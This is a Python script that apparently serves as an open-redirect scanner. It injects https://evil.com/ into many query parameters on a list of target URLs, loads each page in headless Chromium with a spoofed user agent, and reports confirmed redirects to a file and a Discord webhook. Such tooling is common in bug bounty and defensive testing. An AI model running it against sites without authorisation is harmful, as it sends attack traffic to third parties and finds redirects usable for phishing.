#!/usr/bin/env python3

import argparse
import os
import sys
import time
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

import requests
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError


PAYLOAD = "https://evil.com/"
DEFAULT_DELAY = 1.0
DEFAULT_TIMEOUT = 20_000
DEFAULT_BATCH_SIZE = 100

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/128.0.0.0 Safari/537.36"
)


def load_urls(path):
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [
            line.strip()
            for line in f
            if line.strip().startswith(("http://", "https://"))
        ]


def load_parameter_names(path):
    """
    Read ONLY parameters supplied in data/fuzz-params-list.txt.

    Supported formats:

        url
        redirect
        next

    or:

        ?url=test&redirect=test&next=test

    Parameters are NOT discovered from:
      - JSON bodies
      - POST bodies
      - HTML
      - JavaScript
      - target responses
    """

    names = []
    seen = set()

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    for line in content.splitlines():
        line = line.strip()

        if not line:
            continue

        if line.startswith("?"):
            line = line[1:]

        # Query-string style:
        # url=test&redirect=test&next=test
        if "=" in line or "&" in line:
            for key, _ in parse_qsl(
                line,
                keep_blank_values=True
            ):
                key = key.strip()

                if key and key not in seen:
                    seen.add(key)
                    names.append(key)

        # One parameter name per line.
        else:
            key = line.strip()

            if key and key not in seen:
                seen.add(key)
                names.append(key)

    return names


def build_test_url(base_url, parameter_names):
    """
    Keep the original URL/path and existing parameters.

    Parameters from fuzz-params-list.txt are added/overwritten
    with https://evil.com/
    """

    parts = urlsplit(base_url)

    existing = parse_qsl(
        parts.query,
        keep_blank_values=True
    )

    fuzz_parameter_set = set(parameter_names)

    # Keep existing parameters which are not being fuzzed.
    kept = [
        (key, value)
        for key, value in existing
        if key not in fuzz_parameter_set
    ]

    # Add ONLY parameters from fuzz-params-list.txt.
    fuzzed = [
        (name, PAYLOAD)
        for name in parameter_names
    ]

    query = urlencode(
        kept + fuzzed,
        doseq=True
    )

    return urlunsplit(
        (
            parts.scheme,
            parts.netloc,
            parts.path,
            query,
            parts.fragment,
        )
    )


def is_confirmed_redirect(original_url, final_url):
    """
    Confirm only when the browser finally reaches:

        https://evil.com/

    or another path/query on evil.com.
    """

    try:
        original = urlsplit(original_url)
        final = urlsplit(final_url)

        if final.scheme.lower() != "https":
            return False

        if not final.hostname:
            return False

        if final.hostname.lower() != "evil.com":
            return False

        # Make sure this is cross-origin.
        if original.hostname:
            if final.hostname.lower() == original.hostname.lower():
                return False

        return True

    except Exception:
        return False


def send_to_discord(
    webhook_url,
    base_url,
    test_url,
    final_url,
    params,
):
    if not webhook_url:
        print(
            "    ⚠️ DISCORD_WEBHOOK_URL is not configured; "
            "notification skipped."
        )
        return

    message = {
        "content": "🔴 **JS Redirect Vulnerability Confirmed**",
        "embeds": [
            {
                "title": "Open Redirect / JS Redirect",
                "description": (
                    f"**Base URL:** {base_url}\n"
                    f"**Test URL:** {test_url}\n"
                    f"**Final URL:** {final_url}\n"
                    f"**Parameters:** {', '.join(params[:100])}\n"
                    f"**Payload:** {PAYLOAD}"
                ),
            }
        ],
    }

    try:
        response = requests.post(
            webhook_url,
            json=message,
            timeout=10,
        )

        response.raise_for_status()

        print("    📣 Discord notification sent.")

    except Exception as exc:
        print(
            f"    ⚠️ Discord notification failed: {exc}"
        )


def main():

    parser = argparse.ArgumentParser(
        description=(
            "Test JavaScript/open redirects using "
            "batched fuzz parameters."
        )
    )

    parser.add_argument(
        "-l",
        "--list",
        required=True,
        help="Input URL list",
    )

    parser.add_argument(
        "-p",
        "--params",
        required=True,
        help="Fuzz parameter list",
    )

    parser.add_argument(
        "-o",
        "--output",
        default="js_redirect_vulnerable.txt",
        help="Output file",
    )

    parser.add_argument(
        "-d",
        "--delay",
        type=float,
        default=DEFAULT_DELAY,
        help="Delay between requests in seconds",
    )

    parser.add_argument(
        "-t",
        "--timeout",
        type=int,
        default=DEFAULT_TIMEOUT,
        help="Navigation timeout in milliseconds",
    )

    parser.add_argument(
        "--batch-size",
        type=int,
        default=DEFAULT_BATCH_SIZE,
        help="Parameters per request. Default: 100",
    )

    args = parser.parse_args()

    if args.batch_size <= 0:
        parser.error(
            "--batch-size must be greater than 0"
        )

    if not os.path.isfile(args.list):
        print(
            f"[-] URL list not found: {args.list}"
        )
        return 1

    if not os.path.isfile(args.params):
        print(
            f"[-] Parameter list not found: {args.params}"
        )
        return 1

    urls = load_urls(args.list)

    parameters = load_parameter_names(
        args.params
    )

    if not urls:
        print("[-] No HTTP/HTTPS URLs found.")
        return 0

    if not parameters:
        print(
            "[-] No parameters found in fuzz list."
        )
        return 1

    # Split parameters into batches.
    #
    # Example:
    #
    # 250 parameters:
    #
    # 100
    # 100
    # 50

    batches = [
        parameters[i:i + args.batch_size]
        for i in range(
            0,
            len(parameters),
            args.batch_size,
        )
    ]

    webhook_url = os.environ.get(
        "DISCORD_WEBHOOK_URL",
        ""
    ).strip()

    print()
    print("[+] JS Redirect Tester")
    print(
        f"[+] URLs        : {len(urls)}"
    )
    print(
        f"[+] Parameters  : {len(parameters)}"
    )
    print(
        f"[+] Batch size  : {args.batch_size}"
    )
    print(
        f"[+] Requests/URL: {len(batches)}"
    )
    print(
        f"[+] Payload     : {PAYLOAD}"
    )
    print()

    findings = []
    seen_findings = set()

    with sync_playwright() as playwright:

        browser = playwright.chromium.launch(
            headless=True,
            args=[
                "--no-sandbox",
                "--disable-setuid-sandbox",
            ],
        )

        context = browser.new_context(
            user_agent=USER_AGENT
        )

        page = context.new_page()

        try:

            for url_index, base_url in enumerate(
                urls,
                1,
            ):

                print(
                    f"[{url_index}/{len(urls)}] "
                    f"{base_url}"
                )

                for batch_index, batch in enumerate(
                    batches,
                    1,
                ):

                    test_url = build_test_url(
                        base_url,
                        batch,
                    )

                    print(
                        f"    → Batch "
                        f"{batch_index}/{len(batches)} "
                        f"({len(batch)} parameters)"
                    )

                    final_url = test_url

                    try:

                        page.goto(
                            test_url,
                            wait_until="domcontentloaded",
                            timeout=args.timeout,
                        )

                        # Give client-side JavaScript redirects
                        # time to execute.
                        page.wait_for_timeout(
                            1000
                        )

                        # IMPORTANT:
                        # Playwright Python exposes page.url
                        # as a string property, NOT page.url().
                        final_url = page.url

                    except PlaywrightTimeoutError:

                        # Even after a navigation timeout, the
                        # browser may already have redirected.
                        final_url = page.url

                    except Exception as exc:

                        print(
                            f"       ⚠️ Navigation error: "
                            f"{exc}"
                        )

                        time.sleep(
                            max(args.delay, 0)
                        )

                        continue

                    # Check whether browser ended at evil.com.
                    if is_confirmed_redirect(
                        base_url,
                        final_url,
                    ):

                        finding_key = (
                            base_url,
                            final_url,
                            tuple(batch),
                        )

                        if finding_key not in seen_findings:

                            seen_findings.add(
                                finding_key
                            )

                            findings.append(
                                {
                                    "base_url": base_url,
                                    "test_url": test_url,
                                    "final_url": final_url,
                                    "parameters": batch,
                                }
                            )

                            print()
                            print(
                                "       🔴 "
                                "CONFIRMED REDIRECT!"
                            )

                            print(
                                f"       Final URL: "
                                f"{final_url}"
                            )

                            send_to_discord(
                                webhook_url,
                                base_url,
                                test_url,
                                final_url,
                                batch,
                            )

                    else:

                        print(
                            f"       ✓ Final URL: "
                            f"{final_url}"
                        )

                    time.sleep(
                        max(args.delay, 0)
                    )

        finally:

            browser.close()

    # Save confirmed findings.
    with open(
        args.output,
        "w",
        encoding="utf-8",
    ) as out:

        for finding in findings:

            out.write(
                f"URL: {finding['test_url']}\n"
            )

            out.write(
                "JS REDIRECT VULNERABLE!\n"
            )

            out.write(
                f"Final URL: "
                f"{finding['final_url']}\n"
            )

            out.write(
                "Parameters: "
                + ", ".join(
                    finding["parameters"]
                )
                + "\n"
            )

            out.write(
                "---\n"
            )

    print()
    print("[+] Scan completed.")
    print(
        f"[+] Confirmed findings: "
        f"{len(findings)}"
    )
    print(
        f"[+] Results saved to: "
        f"{args.output}"
    )

    return 0


if __name__ == "__main__":
    sys.exit(main())
